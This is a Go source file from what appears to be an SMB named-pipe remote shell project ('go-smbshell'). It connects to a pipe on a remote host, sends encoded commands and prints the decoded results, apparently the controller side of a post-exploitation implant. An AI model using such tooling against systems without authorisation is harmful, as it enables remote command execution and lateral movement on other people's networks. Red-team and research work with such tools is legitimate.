package agent

import (
	"bufio"
	"fmt"
	"go-smbshell/config"
	"go-smbshell/transport"
	"net"

	"gopkg.in/natefinch/npipe.v2"
)

var (
	Conn     net.Conn
	PipeName string
	Target   string
)

func Connect(target string) error {
	var err error
	Conn, err = npipe.Dial(fmt.Sprintf("\\\\%s\\pipe\\%s", target, config.PipeName))
	if err != nil {
		return err
	}
	PipeName, Target = config.PipeName, target
	return nil
}

func Command(command string) {
	if _, err := fmt.Fprintln(Conn, transport.Encoder(command)); err != nil {
		fmt.Println(err.Error())
		return
	}
	r := bufio.NewReader(Conn)
	output, err := r.ReadString('\n')
	if err != nil {
		fmt.Println(err.Error())
		return
	}
	fmt.Println(transport.Decoder(output))
}
